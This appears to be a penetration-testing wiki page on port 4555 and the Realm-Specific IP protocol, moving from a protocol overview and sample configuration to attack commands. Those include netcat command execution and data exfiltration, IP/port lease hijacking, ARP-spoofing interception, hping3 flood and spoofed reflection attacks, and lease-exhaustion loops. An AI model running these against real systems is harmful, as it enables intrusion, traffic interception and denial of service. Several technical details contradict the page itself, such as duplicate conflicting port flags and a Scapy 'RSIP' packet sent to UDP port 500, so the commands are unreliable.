# Index
- [[Ports, Protocols, and Services]]

# Summary

- **Port Number:** 4555 (TCP)
- **Protocol:** TCP/UDP
- **Service Name:** Realm-Specific IP (RSIP)
- **Defined in:** RFC 3102, RFC 3103, RFC 3104

Realm-Specific IP (RSIP) is a network-layer protocol that allows multiple hosts within a private network to share a single public IP address without relying on traditional Network Address Translation (NAT). Unlike NAT, RSIP enables end-to-end address transparency and allows hosts to dynamically acquire public IP addresses and/or ports for direct communication over the internet.

## Overview of Features

- **Address and Port Allocation:** RSIP allows internal hosts to lease a public IP address and/or port from an RSIP gateway, enabling direct communication with external networks.

- **End-to-End Transparency:** RSIP preserves the original IP address and port information for communications, avoiding the address and port translation issues common with NAT.

- **Dynamic Allocation:** The protocol supports dynamic assignment of IP addresses and ports, which can be leased for a specified duration and renewed as needed.

- **Compatibility with NAT:** RSIP is designed as an alternative to NAT but can coexist with NAT solutions, providing flexibility in network design.

- **Security Considerations:** RSIP includes security features to prevent unauthorized allocation of IP addresses and ports, although it is less robust compared to modern security protocols.

## Typical Use Cases

- **IP Address Conservation:** RSIP is used in environments where there is a need to conserve public IP addresses while still allowing multiple hosts within a private network to communicate directly with the internet.

- **Enhanced Security:** Unlike NAT, RSIP provides a mechanism to prevent unauthorized access by controlling the allocation of public IP addresses and ports.

- **Legacy Systems Support:** RSIP can be employed in networks with legacy systems that require end-to-end IP transparency, which NAT typically cannot provide.

- **Testing and Development:** RSIP is occasionally used in controlled environments for testing and development purposes, especially in scenarios requiring address transparency.

## How RSIP Protocol Works

1. **RSIP Client Initialization:**
   - **Step 1:** The RSIP client initiates a request to the RSIP server (gateway) on port 4555 (TCP) to lease a public IP address and/or port.
   - **Step 2:** The request includes the internal (private) IP address of the client, the desired public IP address (if any), and the type of service required (e.g., IP address only, port only, or both).

2. **Address and Port Allocation:**
   - **Step 3:** The RSIP server processes the request and determines whether to grant the requested resources based on its policies and available resources.
   - **Step 4:** If the request is approved, the server allocates a public IP address and/or port to the client and sends a response containing the assigned address and port information.

3. **Communication with External Networks:**
   - **Step 5:** The RSIP client uses the leased public IP address and/or port to establish communication with external networks, bypassing NAT.
   - **Step 6:** All outgoing traffic from the client uses the allocated public IP address and/or port, ensuring end-to-end IP transparency.

4. **Lease Renewal and Termination:**
   - **Step 7:** The client may periodically renew the lease by sending a renewal request to the RSIP server before the lease expires.
   - **Step 8:** If the client no longer needs the leased resources, it sends a release request to the server, which then frees up the IP address and/or port for other clients.

5. **RSIP Gateway Management:**
   - **Step 9:** The RSIP server manages the allocation of IP addresses and ports, maintaining a record of all active leases and ensuring no conflicts arise.

### Diagram (Hypothetical Example)
- **Client:** `<internal_ip>` requests IP and port from RSIP server on `<rsip_server_ip>`:4555.
- **Server:** `<rsip_server_ip>` allocates `<public_ip>:<public_port>` to `<internal_ip>`.
- **Client:** `<internal_ip>` uses `<public_ip>:<public_port>` to communicate with `<external_ip>`.

# Additional Information

## Security Considerations
- **Address Leasing Policies:** RSIP servers can implement policies to control the leasing of IP addresses and ports, such as limiting the lease duration or restricting access based on client identity.
  
- **Authentication Mechanisms:** Although RSIP does not inherently provide strong security, some implementations may include authentication mechanisms to ensure that only authorized clients can lease public IP addresses or ports.

## Alternatives
- **Network Address Translation (NAT):** NAT is the most common alternative to RSIP, providing IP address sharing but without end-to-end transparency.
  
- **Dynamic Host Configuration Protocol (DHCP):** While DHCP is used for IP address allocation within private networks, RSIP extends this concept to public IP addresses and ports for external communication.

## Modes of Operation
- **Address-Only Mode:** The client requests only a public IP address, using its internal ports for communication.
  
- **Port-Only Mode:** The client requests only a public port, using its internal IP address for communication.
  
- **Full Allocation Mode:** The client requests both a public IP address and a port, providing complete external addressability.

## Configuration Files

The configuration of RSIP services typically involves settings in the server's configuration files, which define how IP addresses and ports are allocated to clients.

- **RSIP Server Configuration:**
  - **File Location:** `/etc/rsip/rsipd.conf`
  - **Configuration Example:**
    ```bash
    # RSIP Server Configuration
    port 4555
    address_pool 192.0.2.0/24
    max_lease_time 3600
    authentication required
    ```
  - **Key Settings:**
    - `port`: Defines the port on which the RSIP server listens for client requests.
    - `address_pool`: Specifies the range of public IP addresses available for lease.
    - `max_lease_time`: Sets the maximum duration (in seconds) for which an IP address or port can be leased.
    - `authentication`: Indicates whether authentication is required for clients requesting leases.

## Potential Misconfigurations

1. **Improper Address Pool Configuration:**
   - **Risk:** If the address pool is not correctly configured, clients may receive invalid or overlapping IP addresses, leading to communication failures.
   - **Exploitation:** Attackers could exploit misconfigurations to hijack IP addresses or ports, potentially intercepting or disrupting network traffic.

2. **Inadequate Authentication:**
   - **Risk:** Without proper authentication mechanisms, unauthorized clients could lease public IP addresses and ports, leading to unauthorized access and potential security breaches.
   - **Exploitation:** Attackers could lease resources to launch attacks, such as spoofing or man-in-the-middle attacks.

3. **Failure to Release Resources:**
   - **Risk:** If clients do not properly release leased IP addresses or ports when they are no longer needed, it could lead to resource exhaustion.
   - **Exploitation:** Attackers could intentionally hold onto resources to create a denial-of-service condition, preventing legitimate clients from obtaining necessary leases.

## Default Credentials

RSIP does not have default credentials associated with the protocol itself, but authentication mechanisms may be implemented by the server. If such mechanisms are in place, default credentials would typically be defined in the server’s configuration.

# Interaction and Tools

## Tools

### [[RSIP]]
- **RSIP Lease Request (TCP):** Requests a lease for a specific IP address and/or port from the RSIP server.
    ```bash
    rsip-client --request --ip=<desired_ip> --port=<desired_port> --server=<rsip_server_ip> --port=4555
    ```
- **RSIP Lease Renewal (TCP):** Renews an existing lease, preventing it from expiring.
    ```bash
    rsip-client --renew --lease=<lease_id> --server=<rsip_server_ip> --port=4555
    ```
- **RSIP Lease Release (TCP):** Releases a previously leased IP address or port, making it available for other clients.
    ```bash
    rsip-client --release --lease=<lease_id> --server=<rsip_server_ip> --port=4555
    ```
- **Batch Lease Requests:** Sends multiple lease requests in a loop, useful for testing or bulk allocation scenarios.
    ```bash
    for i in {1..10}; do rsip-client --request --ip=<desired_ip_$i> --port=<desired_port_$i> --server=<rsip_server_ip> --port=4555; done
    ```
- **Custom Lease Configuration:** Requests a lease with a custom lease duration, overriding the server’s default lease time.
    ```bash
    rsip-client --request --ip=<desired_ip> --port=<desired_port> --server=<rsip_server_ip> --port=4555 --lease-time=7200
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 4555"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 4555
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 4555
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 4555 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 4555
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 4555 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:4555
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 4555
    ```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 4555
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 4555
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Resource Hijacking
- **Tool:** [[RSIP]]
    ```bash
    rsip-client --request --ip=<already_allocated_ip> --port=<already_allocated_port> --server=<rsip_server_ip> --port=4555
    ```
- **Description:** Attempts to hijack an already allocated IP resource by requesting the same IP and port as another client.

### Unauthorized Resource Allocation
- **Tool:** [[RSIP]]
    ```bash
    rsip-client --request --ip=<spoofed_ip> --port=<spoofed_port> --server=<rsip_server_ip> --port=4555
    ```
- **Description:** Attempts to allocate IP addresses and ports without proper authorization, potentially leading to unauthorized network access.

### Crafting Malicious RSIP Requests
- **Tool:** [[Scapy]]
	```bash
	from scapy.all import *
	packet = IP(dst="<RSIP_server_ip>")/UDP(dport=500)/Raw(load="malicious request")
	send(packet)
	```
- **Description:** Send custom RSIP requests designed to bypass security checks or trigger vulnerabilities in the RSIP server.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 4555"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

# Exploits and Attacks

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 4555 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 4555 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### RSIP Lease Flooding
- **Tool:** [[RSIP]], [[Custom Scripts]]
    ```bash
    while true; do rsip-client --request --ip=<desired_ip> --port=<desired_port> --server=<rsip_server_ip> --port=4555; done
    ```
- **Description:** Flood the RSIP server with lease requests to exhaust its available IP addresses and ports, leading to a denial of service.

### Exhaustion Attack
- **Tool:** [[Scapy]]
    ```python
    from scapy.all import *
    packet = IP(dst="<rsip_server_ip>")/TCP(dport=4555)/Raw(load="RSIP request")
    send(packet, loop=1)
    ```
- **Description:** Continuously send RSIP requests to exhaust server resources, causing service disruption.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 3102 - RSIP Framework|https://tools.ietf.org/html/rfc3102|
|RFC 3103 - RSIP Protocol Specifications|https://tools.ietf.org/html/rfc3103|
|RFC 3104 - RSIP Applicability Statement|https://tools.ietf.org/html/rfc3104|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|hping3 Manual|http://www.hping.org/manpage.html|
|Hydra (password brute-forcing tool)|https://github.com/vanhauser-thc/thc-hydra|
|Linux man-pages|https://man7.org/linux/man-pages/|
|TCP/IP Illustrated|https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469|